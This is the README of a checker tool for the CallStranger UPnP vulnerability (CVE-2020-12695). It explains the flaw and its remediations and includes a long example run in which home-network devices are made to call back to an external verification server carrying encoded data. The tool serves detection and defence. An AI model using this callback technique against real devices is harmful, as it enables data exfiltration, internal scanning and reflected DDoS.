## CallStranger


This script created by Yunus Çadırcı (https://twitter.com/yunuscadirci) to check against CallStranger (CVE-2020-12695) vulnerability. An attacker can use this vulnerability for:
* Bypassing DLP for exfiltrating data
* Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS / SYN Flood
* Scanning internal ports from Internet facing UPnP devices
You can find detailed information on https://www.callstranger.com https://kb.cert.org/vuls/id/339275 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695
Slightly modified version of https://github.com/5kyc0d3r/upnpy used for base UPnP communication

## CallStranger Vulnerability

The CallStranger vulnerability that is found in billions of UPNP devices can be used to exfiltrate data (even if you have proper DLP/border security means) or scan your network or even cause your network to participate in a DDoS attack.     
The vulnerability – CallStranger – is caused by Callback header value in UPnP SUBSCRIBE function can be controlled by an attacker and enables an SSRF-like vulnerability which affects millions of Internet facing and billions of LAN devices. This vulnerability can used for
●	Bypassing DLP and network security devices to exfiltrate data
●	Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS (not same with https://www.cloudflare.com/learning/ddos/ssdp-ddos-attack/ )
●	Scanning internal ports from Internet facing UPnP devices
Possible remediations:
●	Disable unnecessary UPnP services especially for Internet facing devices/interfaces.
●	Check Intranet and server networks to be sure UPnP devices (Routers, IP cameras, printers, media gateways etc.) are not  allowing data exfiltration.
●	Make an assessment  on network security logs if this vulnerability had been used any threat actor.
●	Contact to ISP/ DDoS protection vendor if their solutions can block traffic generated by UPnP SUBSCRIBE (HTTP NOTIFY) 
Because this is a protocol vulnerability, it may take a long  time for vendors to provide patches. Visit https://callstranger.com and https://kb.cert.org/vuls/id/339275 for detailed information, affected devices, software, and to follow updates. CVE-2020-12695 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695 is assigned to CallStranger.
OCF updated UPnP specification on 17.04.2020 to remediate this vulnerability. Check new specification on https://openconnectivity.org/upnp-specs/UPnP-arch-DeviceArchitecture-v2.0-20200417.pdf 

## Install

    sudo python3 setup.py install
if needed

    sudo pip3 install -r requirements.txt
cryptography
requests
termcolor

## Usage

just navigate to CallStranger and

    python3 CallStranger.py
	python3 CallDirect.py http://DeviceDocumentPath
	example: python3 CallDirect.py http://192.168.1.1:37215/upnpdev.xml

## How script works?

 1. Finds all UPnP devices on LAN 
 2. Finds all UPnP services 
 3. Finds all subscription endpoints 
 4. Sends these endpoints as encryted to     verification server via UPnP Callback. 
 5.  Server can't see this endpoints because all encryption is done on client side 
 6. Gets encrypted service list from verification server and decrypts on client side
 7.  Compares found UPnP services with  verified ones

## Example Output

    _________        .__  .__    _________ __
    \_   ___ \_____  |  | |  |  /   _____//  |_____________    ____    ____   ___________
    /    \  \/\__  \ |  | |  |  \_____  \   __\_  __ \__  \  /    \  / ___\_/ __ \_  __ \
    \     \____/ __ \|  |_|  |__/        \|  |  |  | \// __ \|   |  \/ /_/  >  ___/|  | \/
     \______  (____  /____/____/_______  /|__|  |__|  (____  /___|  /\___  / \___  >__|
            \/     \/                  \/                  \/     \//_____/      \/
    This script created by Yunus Çadırcı (https://twitter.com/yunuscadirci) to check against CallStranger (CVE-2020-12695) vulnerability. An attacker can use this vulnerability for:
    * Bypassing DLP for exfiltrating data
    * Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS / SYN Flood
    * Scanning internal ports from Internet facing UPnP devices
    You can find detailed information on https://www.callstranger.com  https://kb.cert.org/vuls/id/339275 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695
    Slightly modified version of https://github.com/5kyc0d3r/upnpy used for base UPnP communication
    Stranger Host: http://20.42.105.45
    Stranger Port: 80
    !Error in service definition http://192.168.1.24:2869 urn:dial-multiscreen-org:service:dial:1
    10  devices found:
    
     Huawei Home Gateway http://192.168.1.1:37215 ( http://192.168.1.1:37215/upnpdev.xml )
    
      5 service(s) found for Huawei Home Gateway
         urn:schemas-upnp-org:service:Layer3Forwarding:1    --> http://192.168.1.1:37215/evt/Layer3Forwarding_1
         urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1    --> http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1
         urn:schemas-upnp-org:service:WANPPPConnection:1    --> http://192.168.1.1:37215/evt/WANPPPConnection_1
         urn:schemas-upnp-org:service:WANEthernetLinkConfig:1       --> http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1
         urn:schemas-upnp-org:service:LANHostConfigManagement:1     --> http://192.168.1.1:37215/evt/LANHostConfigManagement_1
    
     OturmaTV http://192.168.1.22:2870 ( http://192.168.1.22:2870/dmr.xml )
    
      3 service(s) found for OturmaTV
         urn:schemas-upnp-org:service:RenderingControl:3    --> http://192.168.1.22:2870/event/RenderingControl
         urn:schemas-upnp-org:service:ConnectionManager:3   --> http://192.168.1.22:2870/event/ConnectionManager
         urn:schemas-upnp-org:service:AVTransport:3         --> http://192.168.1.22:2870/event/AVTransport
    
     ChromecastOturma4k http://192.168.1.21:8008 ( http://192.168.1.21:8008/ssdp/device-desc.xml )
    
      1 service(s) found for ChromecastOturma4k
         urn:dial-multiscreen-org:service:dial:1    --> http://192.168.1.21:8008/ssdp/notfound
         --skipping  http://192.168.1.21:8008/ssdp/notfound because it contains dummy service keywords
    
     VESTEL TV http://192.168.1.40:2870 ( http://192.168.1.40:2870/dmr.xml )
    
      3 service(s) found for VESTEL TV
         urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.40:2870/RenderingControl/event
         urn:schemas-upnp-org:service:ConnectionManager:1   --> http://192.168.1.40:2870/ConnectionManager/event
         urn:schemas-upnp-org:service:AVTransport:1         --> http://192.168.1.40:2870/AVTransport/event
    
     MutfakChromecast http://192.168.1.36:8008 ( http://192.168.1.36:8008/ssdp/device-desc.xml )
    
      1 service(s) found for MutfakChromecast
         urn:dial-multiscreen-org:service:dial:1    --> http://192.168.1.36:8008/ssdp/notfound
         --skipping  http://192.168.1.36:8008/ssdp/notfound because it contains dummy service keywords
    
     VESTEL TV http://192.168.1.40:2870 ( http://192.168.1.40:2870/dmr.xml )
    
      3 service(s) found for VESTEL TV
         urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.40:2870/RenderingControl/event
         urn:schemas-upnp-org:service:ConnectionManager:1   --> http://192.168.1.40:2870/ConnectionManager/event
         urn:schemas-upnp-org:service:AVTransport:1         --> http://192.168.1.40:2870/AVTransport/event
    
     DESKTOP-AEE3E5V http://192.168.1.31:2869 ( http://192.168.1.31:2869/upnphost/udhisapi.dll?content=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695 )
    
      1 service(s) found for DESKTOP-AEE3E5V
         urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl
    
     OturmaTV http://192.168.1.22:49154 ( http://192.168.1.22:49154/nmsDescription.xml )
    
      2 service(s) found for OturmaTV
         urn:schemas-upnp-org:service:ContentDirectory:3    --> http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO
         urn:schemas-upnp-org:service:ConnectionManager:2   --> http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO
    
     XboxOne http://192.168.1.24:2869 ( http://192.168.1.24:2869/upnphost/udhisapi.dll?content=uuid:e69c8b0b-8a9d-4811-839e-c94650077ee0 )
    
      0 service(s) found for XboxOne
    
     XboxOne http://192.168.1.24:2869 ( http://192.168.1.24:2869/upnphost/udhisapi.dll?content=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c )
    
      3 service(s) found for XboxOne
         urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl
         urn:schemas-upnp-org:service:AVTransport:1         --> http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport
         urn:schemas-upnp-org:service:ConnectionManager:1   --> http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager
    
     Total 20 service(s) found. do you want to continue to VERIFY if service(s) are vulnerable?
    Be careful: This operation needs Internet access and may transfer data about devices over network. Data encrypted on local and we cant see which services are vulnerable but ISPs and other elements may be able to inspect HTTP headers created by UPnP device. Because most of UPnPstack do not allow SSL connection we can not use it.
    Do you want to continue? y/N y
    Successfully get session:nae9lqq3keg79l3qei9ahohvqe
    Symmetric random key for encryption: b'yy8e8uAg4kV-oSAuvdxrJBPwxMHx0JuEm1BsYXCzBYE='  We do not send this value to server so we can not see which services are vulnerable. All confirmation process is done on client side
    Calling stranger for  http://192.168.1.1:37215/evt/Layer3Forwarding_1 with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNsB6Kv35geEsxbkkrAgED5So1wLhWURjcFwkyJ9h7w21BtUmbBmzAQ_YTgN-168MatiFy-skmKyTcleLkVKn5iv6xhEcY5DGiH_MJbeeZ77_AmgM_UF4dqqXsIdHJmROk&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.1:37215/evt/Layer3Forwarding_1 seems successfull
    {'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:50898211-6467-9505-1115-309761531064', 'Date': 'Mon, 08 Jun 2020 07:15:22 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1 with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWN7k769GzqT9VpIDZr2e93mpy8uz70lvmdxGSssRVWvn6Q8nGvA7nmKEVU4nWTA5c4eelJ7T2U8hGxvwVLlTl15LZ2_XH8boVyb45wS5oPB93CdwqUU0T1hHDDY5r4AFEjcmhHvYtx8RC_tAzm2eRk7w==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1 seems successfull
    {'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:07788594-5417-8052-8862-186260512738', 'Date': 'Mon, 08 Jun 2020 07:15:22 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.1:37215/evt/WANPPPConnection_1 with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWN5YhNQVAQagPd3LpBocI7jwkv8caPKiPAfeeD5X1uNSFZ7mfTWB3QwFcsVcbFln5JrVD3mlvHzD3UrYUC0VK_uRHd_c2K-m6h_Od2NUNB1dduNNMh7rMa0a2Wlq8WxxZn&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.1:37215/evt/WANPPPConnection_1 seems successfull
    {'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:82456222-8470-4699-7387-649194725316', 'Date': 'Mon, 08 Jun 2020 07:15:22 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1 with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNRSj2ZczT5L4ZJvtQtwtyQaQmiYBdMAP96q-x1eCWLXAwGIIHMwZ6wvkPtlI0eAaYQHfOHqxrK2PvyYjKveFA9sbo4iyZ0vQKEyxStzRPCLQep4s0c0Lu53em19SP9T0S6FwCn8ISqe3RhloXMlA6nw==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1 seems successfull
    {'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:97714486-6046-2730-7119-835081292303', 'Date': 'Mon, 08 Jun 2020 07:15:23 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.1:37215/evt/LANHostConfigManagement_1 with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNM3m3GW8-4btkYqaWTStBESHNmhQqZwEDd8jRONZyHcWwp8aQDkTpIk__0qv0m7vLuRdfCVt0P5n3oRcbnUXvUh3BPZ1ZwRfXtFyWr3PjKcIVbvkGj4EWD2pFKeiBEFDfZKRvR0pzFnqdxdiUuSRytQ==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.1:37215/evt/LANHostConfigManagement_1 failed with status code:501
    {'Server': 'ATP UPnP Core', 'Date': 'Mon, 08 Jun 2020 07:15:23 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.22:2870/event/RenderingControl with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNny3BDg9OPz7WaHI8MiJpkALTuYhq7nY6l4raSduMcqumRKn4UlCXYs3sU9MgDhSi8-WtjR_X45asVQ3-r5fZ4ky6LR0WiG4BhqUTwmkf2615sCC3G4ZSfRGYq-G5qWVX&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.22:2870/event/RenderingControl seems successfull
    {'DATE': 'Mon, 08 Jun 2020 07:15:24 GMT', 'SERVER': 'IPI/1.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:1387715a-035e-1090-b8e1-eef4918f5627', 'TIMEOUT': 'Second-300', 'CONTENT-LENGTH': '0', 'CONNECTION': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.22:2870/event/ConnectionManager with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNKQTdXOAlJaFdcir5kgI_v9PxZnpeWD-9IS6U2TqMM2aL1a4gg-JTL3CT5K8ZWAUBbEePDGqzqv7iiDzk41AMEiXILhED7lGiJ6wOO3LMSXNhamdQ37BLa8AoWmUuDGBxe-AEss0TC-QY8g7I67M68Q==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.22:2870/event/ConnectionManager seems successfull
    {'DATE': 'Mon, 08 Jun 2020 07:15:24 GMT', 'SERVER': 'IPI/1.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:138b078e-035e-1090-a367-cb37c034dcad', 'TIMEOUT': 'Second-300', 'CONTENT-LENGTH': '0', 'CONNECTION': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.22:2870/event/AVTransport with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNw-5CaKWtBdFlWBV6PQtV4Q8koFEr9nKRbAOAm-_f035IQl9uUNY6MdrneLHLi_tBKJ37i5OOLiBsOYADTUpYtsFWApBe3NPCQgJDh5omi2mmClmPiVCPdjUNu7-TYmiK&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.22:2870/event/AVTransport seems successfull
    {'DATE': 'Mon, 08 Jun 2020 07:15:24 GMT', 'SERVER': 'IPI/1.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:138da0f2-035e-1090-9f01-aca6dbf642e0', 'TIMEOUT': 'Second-300', 'CONTENT-LENGTH': '0', 'CONNECTION': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.40:2870/RenderingControl/event with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNtLC8GIuICPflEhBEu8nFgxe12U0nnrJ_ewbmVwlrtu0yEqC6rWp3CuUgYdHSYalFv8dG5ETCsQBnx6PVdHbSzk6EGpYBwo8nvdXqJtdnvnjeveUz9Q4bhwZ4qDKKmiQb&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.40:2870/RenderingControl/event seems successfull
    {'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13e92d5a-035e-1090-8000-bc52a0dfdacc', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.40:2870/ConnectionManager/event with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNJJsfohjZJRLZdiBF4Kvt1amVenr9a1Zi3oHhu_Xfomk_li6uJ9l0OeR6YVh2d6qbCF-t1uAmMVJfs5Tu7FWiNg15UXhyF8ubI_YZxtXTC4zpxHt7r2MdISJ8WwOFQ_J-f6E5yV6Bv8c4A1BBqfuD2Q==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.40:2870/ConnectionManager/event seems successfull
    {'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13ec9fee-035e-1090-8000-bc52a0dfdacc', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.40:2870/AVTransport/event with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWN0JCuymqONPp3Sbu9E_TUiUmXTZ5s777Hm2WsV7CO40kqjYGLoibSPew4uBpjel6Y_pOKPQOf3PsZwKG-PIC0G5jJiqEHmwRFI-Bd6ftBUIltwYGTtiBYII1QHfQ2c7mp&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.40:2870/AVTransport/event seems successfull
    {'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13f07b14-035e-1090-8000-bc52a0dfdacc', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.40:2870/RenderingControl/event with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNZwdAHuBpKwJw6L4vBT59oY3xnIU5iS85Gkmp8Ajo1p7gQx3FmvvyeWdNvX0vNhJ5ZDYLqJNp_Sct_F6xzJFlHSFe2nj4EvtiPL-GbHfBlHsthplZFfczbyXoqFxgwOlw&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.40:2870/RenderingControl/event seems successfull
    {'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13f45a54-035e-1090-8000-bc52a0dfdacc', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.40:2870/ConnectionManager/event with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNlKb5TTOnwnyQPA3au856DTuiCwyYdtGcCpSYHFNCBJ4j1Tr-1HbnLV59m9kHppA6GYRZpECoT-2s7MAwIpjvcllbbCdc0ORHoA40jDBwzdqECjLPCZnM1GncnOgfSFvfTYnbOMbnbYlY825Oi0f_ZA==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.40:2870/ConnectionManager/event seems successfull
    {'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13f8483a-035e-1090-8000-bc52a0dfdacc', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.40:2870/AVTransport/event with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNBpQ_jvIj1auFPntVMxiNgqCAMMLd4m960P-5nA87VRRR-cCDjUthjQ1BaiXYGw9lJ2QS6u6Iq1jl_ugpE8ef7hoeuK9oT33wDIjm9cST_xj4IYW_S2SddtSsHhIwtkMX&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.40:2870/AVTransport/event seems successfull
    {'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13fc0db2-035e-1090-8000-bc52a0dfdacc', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
    
    Calling stranger for  http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNk6hSWo8XmOpY-kvAsWA4ztVyP71dJy0Pit2GWl9lH5u7CiU8selzo2uSXmRczZYz2MMwbF45En3rkfmhk5JkRHRQOpytn1GhDClqevh-S6UBAiDiRvcnBFRhAyb-C6mjvOCbjpZ1amIaQs5wxPFH9OSCT6aeIp5BRPeCLbk0XsbExDvq7Kilmf0X-CeoJxwrOlzhEFt3aA9UbzrP5WKq_6KAVtxk_rDMemINYtBsjMwyAwSFIr2duohzAsL7pe-f&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl seems successfull
    {'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:73096487-e9ce-4781-93bf-b5529b4120e9', 'Date': 'Mon, 08 Jun 2020 07:15:23 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNA1hU2ZXgFrbgMOrf3NfpHkNgShYE8oH0Zr1D8j1NHPWqCe7bEs_7g2TnvFmeoOE7hCLuzKVxdmviS-WjlvHLMlKzpJ9Yp4GxsPzviV8JD-Gnfj4yrt-SXcJe2c7Hb88BKxBqH5yRxSRZRSr6t7Ehjg==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO seems successfull
    {'DATE': 'Mon, 08 Jun 2020 07:15:24 GMT', 'SERVER': 'Linux2.6/0.0 UPnP/1.0 PhilipsIntelSDK/1.4 DLNADOC/1.50', 'SID': 'uuid:C0A80120-0000-0000-0ECC-000000000013', 'TIMEOUT': 'Second-300', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNaIGyRbT5EdecQpW24gV91ivFeWp9wbRY1iDwwv97ffOeptG7yMGm_XUTfxnSgORfXKCvwCLnfqgyh-F5uwoUVO3edotw_WgJ600TBDPVojsj2XYdPiaDEUN29S6TYk-BO4AqCTq6SyZ6bo-DqjcjYw==&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO seems successfull
    {'DATE': 'Mon, 08 Jun 2020 07:15:24 GMT', 'SERVER': 'Linux2.6/0.0 UPnP/1.0 PhilipsIntelSDK/1.4 DLNADOC/1.50', 'SID': 'uuid:C0A80120-0000-0000-0ECC-000000000014', 'TIMEOUT': 'Second-300', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNXMZtJ2FXZUd6l9fPF4W6zyJ-jSIV7-YnsOAuS_3P8Qg_J59XfUp5l5SFUFzL5d_SyCFtTENW2sMrQZjGt5ZGZBMjmZfnNjNfmwpJwN9ZjKK_NCy4NRV69ipJG3E5evaeEbg4cOh2iwM_eCMyMdPzYD4MNBKaDFHG3QTUpPItjGdX169O3A77VaLH61OV0QSFmUcYro7yYCGRrj1B3G6Gl9vHPXUxfVZN5GqhgW2sHvZmTZUs7UKLVgzoEaS2Oy6h&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl seems successfull
    {'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:2c36537d-018d-4ea9-ae60-83063198d187', 'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNdiaamddL1mXEEsXlJQRwPTTyy1vsWMFfYS02X8or9Rk8oS_nQPzDJzDYhn2UrwRgdW1evZRz-lYAmFqZnyb6R6JH0kFpd5Ds36KpFssmKRwTUBaRv3LjYl5SDt7r4Q1TCeGuKRHAPOQ3nKv5xovNNtNz38k-escgkwW9oRBPQAFnLZxQPwh3eb8bfLUl_1nxwZsdPKfB8Fp_wOjNezjXql9ljwtkzMy2Rzas9D9T9AoydyV_I60qyjJVNHy4As6T&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport seems successfull
    {'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:ad2d70f1-39c9-4a6c-83f8-a435ba8dbe51', 'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Content-Length': '0'}
    
    Calling stranger for  http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager with http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABe3eWNSafCBN8pkwe2BMPrzwV1SzOUWciHVwYbPyTt1tut-PEkaQ2oDjS0yz0hd0t02pD35_DIkHhV_XRaGq5KMMdo6nnJ5sFjvhQ0uAilJF-4doO7DdWww7YNyZdo4258jmLQ2YRLSXodwQJXUlvVJN3pJIe4e9m9MjCbT214I61Ue14euKxx470mSpvpZCnVeQYnnUoS8SKkXibFVmJ-qpW4Ep3x8Xbb34GnSXe01OJpvf39uYZGsuKz0paeVgJTbnLl&token=nae9lqq3keg79l3qei9ahohvqe
    Subscribe to http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager seems successfull
    {'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:51865133-d912-4c0c-9447-9615ef57f2e2', 'Date': 'Mon, 08 Jun 2020 07:15:24 GMT', 'Content-Length': '0'}
    
    
            Waiting 5 second for asynchronous request
    Successfully get services from server: http://20.42.105.45:80/CallStranger.php?c=getservices&token=nae9lqq3keg79l3qei9ahohvqe
    
    Encrypted vulnerable services:
    gAAAAABe3eWNny3BDg9OPz7WaHI8MiJpkALTuYhq7nY6l4raSduMcqumRKn4UlCXYs3sU9MgDhSi8-WtjR_X45asVQ3-r5fZ4ky6LR0WiG4BhqUTwmkf2615sCC3G4ZSfRGYq-G5qWVX
    gAAAAABe3eWNKQTdXOAlJaFdcir5kgI_v9PxZnpeWD-9IS6U2TqMM2aL1a4gg-JTL3CT5K8ZWAUBbEePDGqzqv7iiDzk41AMEiXILhED7lGiJ6wOO3LMSXNhamdQ37BLa8AoWmUuDGBxe-AEss0TC-QY8g7I67M68Q==
    gAAAAABe3eWNw-5CaKWtBdFlWBV6PQtV4Q8koFEr9nKRbAOAm-_f035IQl9uUNY6MdrneLHLi_tBKJ37i5OOLiBsOYADTUpYtsFWApBe3NPCQgJDh5omi2mmClmPiVCPdjUNu7-TYmiK
    gAAAAABe3eWNtLC8GIuICPflEhBEu8nFgxe12U0nnrJ_ewbmVwlrtu0yEqC6rWp3CuUgYdHSYalFv8dG5ETCsQBnx6PVdHbSzk6EGpYBwo8nvdXqJtdnvnjeveUz9Q4bhwZ4qDKKmiQb
    gAAAAABe3eWNJJsfohjZJRLZdiBF4Kvt1amVenr9a1Zi3oHhu_Xfomk_li6uJ9l0OeR6YVh2d6qbCF-t1uAmMVJfs5Tu7FWiNg15UXhyF8ubI_YZxtXTC4zpxHt7r2MdISJ8WwOFQ_J-f6E5yV6Bv8c4A1BBqfuD2Q==
    gAAAAABe3eWN0JCuymqONPp3Sbu9E_TUiUmXTZ5s777Hm2WsV7CO40kqjYGLoibSPew4uBpjel6Y_pOKPQOf3PsZwKG-PIC0G5jJiqEHmwRFI-Bd6ftBUIltwYGTtiBYII1QHfQ2c7mp
    gAAAAABe3eWNsB6Kv35geEsxbkkrAgED5So1wLhWURjcFwkyJ9h7w21BtUmbBmzAQ_YTgN-168MatiFy-skmKyTcleLkVKn5iv6xhEcY5DGiH_MJbeeZ77_AmgM_UF4dqqXsIdHJmROk
    gAAAAABe3eWNZwdAHuBpKwJw6L4vBT59oY3xnIU5iS85Gkmp8Ajo1p7gQx3FmvvyeWdNvX0vNhJ5ZDYLqJNp_Sct_F6xzJFlHSFe2nj4EvtiPL-GbHfBlHsthplZFfczbyXoqFxgwOlw
